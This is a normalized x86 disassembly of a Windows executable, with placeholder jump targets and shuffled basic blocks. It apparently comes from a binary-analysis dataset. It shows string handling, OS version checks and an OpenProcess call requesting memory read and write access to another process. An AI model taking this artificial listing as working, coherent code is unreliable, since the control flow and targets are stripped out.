mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub_4071bc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_407250
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
xor ebx ebx
add esi 0x1c
add edi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp edi esi
je r-xdata
mov eax edi
pop ebx
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ edi ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov [ edi ] ecx
mov [ esi ] ebx
mov edx [ esi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push esi
push edi
call sub_437db0
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edi + 0x10 ] edx
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
sub_4072e0
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push esi
lea esi [ eax + 0x1 ]
mov eax edi
call sub_401ef0
test al al
je r-xdata
push r--data
call sub_435a79
mov eax edi
pop esi
retn
mov ecx [ edi + 0x10 ]
mov edx 0x8
cmp [ edi + 0x14 ] edx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ eax + esi * 2 ] dx
mov eax [ edi ]
xor edx edx
mov [ eax + esi * 2 ] dx
mov eax edi
pop esi
retn
mov [ eax + ecx * 2 ] bx
mov [ edi + 0x10 ] esi
cmp [ edi + 0x14 ] edx
jb r-xdata
sub_407340
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x4 ]
push eax
call sub_43640d
mov ax [ ebp - 0x4 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_407370
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov eax ebx
push edi
mov [ ebp - 0x8 ] esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ eax + 0x1 ]
mov [ ebp - 0x10 ] edi
cmp edi esi
jbe r-xdata
inc esi
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
mov ebx eax
mov edi ebx
mov [ ebp - 0xc ] 0x0
test esi esi
je r-xdata
lea esp [ esp ]
xor ecx ecx
mov [ edi ] cx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
add ebx eax
inc esi
sub edi eax
jne r-xdata
add [ ebp + 0x8 ] eax
add edi 0x2
dec esi
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edi
lea edx [ ebp - 0x4 ]
push ebx
push edx
call sub_43640d
add esp 0x14
test eax eax
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edx
push eax
push edi
call sub_43640d
add esp 0x14
test eax eax
jle r-xdata
sub_407430
push ebp
mov ebp esp
push 0xffffffff
push sub_452b83
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ ebp - 0x8d ] bl
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] cx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] dx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_40d910
add esp 0x8
test al al
je r-xdata
push ebx
lea edx [ ebp - 0x8c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
lea eax [ ebp + 0x8 ]
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax 0x1
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push ecx
lea edx [ ebp - 0x54 ]
push edx
push ecx
push r--data
push ecx
lea eax [ ebp + 0x8 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp eax 0x3
je r-xdata
mov esi 0x8
cmp [ ebp - 0x78 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
cmp [ ebp - 0x40 ] esi
jb r-xdata
mov edx [ ebp - 0x8c ]
push edx
call sub_43811c
add esp 0x4
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov esi 0x8
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor ecx ecx
mov edi 0x7
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] cx
cmp [ ebp - 0x5c ] esi
jb r-xdata
mov eax [ ebp - 0x54 ]
push eax
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
mov edx [ ebp + 0x50 ]
mov eax [ ebp + 0x4c ]
mov ecx [ ebp + 0x44 ]
push edx
push eax
push ecx
sub esp 0x1c
mov edi esp
mov [ ebp - 0x94 ] esp
push ebx
lea eax [ ebp + 0x24 ]
xor edx edx
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x48 ]
push ecx
mov ecx [ ebp + 0x40 ]
call sub_407770
add esp 0x2c
mov [ ebp - 0x8d ] al
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor eax eax
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] ax
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x70 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
xor edx edx
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_43811c
add esp 0x4
mov al [ ebp - 0x8d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x24 ]
push eax
call sub_43811c
add esp 0x4
sub_407770
push ebp
mov ebp esp
push 0xffffffff
push sub_452b2b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x94 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0xa8 ] edx
mov [ ebp - 0xa0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ ebp - 0x8d ] 0x0
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] cx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x50 ] dx
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x1c ] edi
lea ecx [ ebp - 0x94 ]
sete al
test al al
setne dl
push ecx
lea eax [ ebp + 0xc ]
lea ecx [ ebp - 0x8c ]
dec edx
and edx eax
push edx
push ecx
call sub_40b420
add esp 0xc
test al al
je r-xdata
push edi
lea eax [ ebp - 0x30 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ebx [ ebp - 0x94 ]
mov edx [ ebp - 0x78 ]
mov eax [ ebp - 0x74 ]
push ebx
push edi
push 0x38
mov [ ebp - 0xac ] edx
mov [ ebp - 0x9c ] eax
call [ OpenProcess@IAT ]
mov [ ebp - 0x98 ] eax
cmp eax edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push edi
lea ecx [ ebp - 0x30 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
jmp r-xdata
push r--data
push ecx
push ebx
push ecx
push r--data
push ecx
lea ecx [ ebp + 0xc ]
push ecx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
test cl 0x6
jne r-xdata
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edi 0x8
cmp [ ebp - 0x3c ] edi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov esi [ ebp - 0x98 ]
mov eax [ ebp - 0xa4 ]
mov ecx [ ebp - 0x9c ]
mov edi [ ebp + 0x28 ]
push esi
lea edx [ ebp - 0x94 ]
push edx
push eax
mov eax [ ebp - 0xac ]
add ecx eax
push ecx
push eax
mov [ ebp - 0x94 ] 0x0
call sub_406610
add esp 0x14
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
xor ebx ebx
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] cx
cmp [ ebp - 0x58 ] edi
jb r-xdata
mov eax [ ebp - 0x50 ]
push eax
call sub_43811c
add esp 0x4
push 0x0
lea edx [ ebp - 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ebp - 0x94 ]
mov ecx [ ebp - 0xa0 ]
mov edx [ ebp - 0xa8 ]
lea edi [ ecx + eax ]
mov eax esi
mov esi [ ebp + 0x2c ]
push edx
call sub_406560
add esp 0x4
mov [ ebp - 0x8d ] al
test al al
mov eax r--data
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
xor eax eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] ax
cmp [ ebp + 0x20 ] edi
jb r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push eax
push ecx
push r--data
push ecx
push ebx
push ecx
push r--data
push ecx
lea edx [ ebp + 0xc ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
mov al [ ebp - 0x8d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
call sub_43811c
add esp 0x4
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x98 ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
mov eax [ ebp - 0x98 ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
or eax 0x4
sub_407c10
cmp [ esi + 0x50 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x50 ] 0x7
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x3c ] cx
cmp [ esi + 0x34 ] 0x8
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi + 0x34 ] 0x7
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x20 ] ax
retn
mov edx [ esi + 0x20 ]
push edx
call sub_43811c
add esp 0x4
sub_407c60
push ebp
mov ebp esp
sub esp 0x150
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push 0x11c
mov [ ebp - 0x12c ] eax
lea eax [ ebp - 0x120 ]
push 0x0
push eax
mov [ ebp - 0x128 ] ecx
mov [ ebp - 0x124 ] edx
call sub_43a820
add esp 0xc
lea ecx [ ebp - 0x120 ]
push ecx
mov [ ebp - 0x120 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp - 0x12c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x11c ]
mov eax [ ebp - 0x118 ]
mov [ esi ] edx
mov [ edi ] eax
mov eax [ ebp - 0x128 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x114 ]
mov [ eax ] ecx
mov esi [ ebp - 0x124 ]
test esi esi
je r-xdata
cmp [ ebp - 0x6 ] 0x1
setne dl
mov [ eax ] dl
lea eax [ ebp - 0x150 ]
push eax
call [ GetNativeSystemInfo@IAT ]
cmp [ ebp - 0x150 ] 0x9
sete cl
mov [ esi ] cl
sub_407d40
push ebp
mov ebp esp
push 0xffffffff
push sub_452ad8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0x2d ]
lea ecx [ ebp - 0x2e ]
lea edi [ ebp - 0x3c ]
xor ebx ebx
call sub_407c60
add esp 0x8
test al al
je r-xdata
push ebx
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] ebx
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esi ]
cmp edx [ ebp - 0x34 ]
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor al al
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x3c ]
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x38 ]
je r-xdata
mov al bl
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov cl [ esi + 0xc ]
cmp cl [ ebp - 0x2e ]
jne r-xdata
cmp eax ebx
jne r-xdata
mov dl [ esi + 0xd ]
cmp dl [ ebp - 0x2d ]
jne r-xdata
mov al 0x1
jmp r-xdata
sub_407e80
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0xc
ja r-xdata
lea ecx [ ebp - 0x10 ]
call sub_407d40
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_408034 ]
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x5
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
call sub_407d40
mov esp ebp
pop ebp
retn
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x5
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_407d40
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x5
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x5
mov [ ebp - 0xc ] 0x2
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x100
call sub_407d40
mov esp ebp
pop ebp
retn
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x5
mov [ ebp - 0xc ] 0x2
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_407d40
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x5
mov [ ebp - 0xc ] 0x2
jmp r-xdata
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
call sub_407d40
mov esp ebp
pop ebp
retn
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x100
call sub_407d40
mov esp ebp
pop ebp
retn
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_407d40
mov esp ebp
pop ebp
retn
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x101
call sub_407d40
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
mov ecx 0x1
mov [ ebp - 0xc ] ecx
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x100
call sub_407d40
mov esp ebp
pop ebp
retn
mov ecx 0x1
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x101
xor eax eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
call sub_407d40
mov esp ebp
pop ebp
retn
sub_408070
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
xor bl bl
cmp esi [ edi + 0x4 ]
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edi edi
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
mov al bl
pop ebx
retn
mov eax [ esi ]
call sub_407e80
add esi 0x4
mov bl al
cmp esi [ edi + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
test bl bl
jne r-xdata
test bl bl
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_408110
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_405a70
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_408170
push ebp
mov ebp esp
push 0xffffffff
push sub_452312
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
xor esi esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x30 ] ebx
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
cmp [ eax + ebx + 0xc ] esi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + ebx + 0xc ] esi
sete cl
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + ebx + 0x3c ]
cmp eax esi
je r-xdata
mov edx [ ebx ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx ebx
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx ebx
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_40a340
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
cmp edi esi
je r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + ebx + 0x38 ]
movzx ecx [ ecx + ebx + 0x40 ]
push edx
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0x20 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x24 ]
add eax ebx
push eax
lea esi [ ebp - 0x28 ]
call sub_4084c0
cmp [ eax ] 0x0
je r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_436188
mov eax [ edi + 0x4 ]
cmp eax esi
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx ebx
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_408299
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
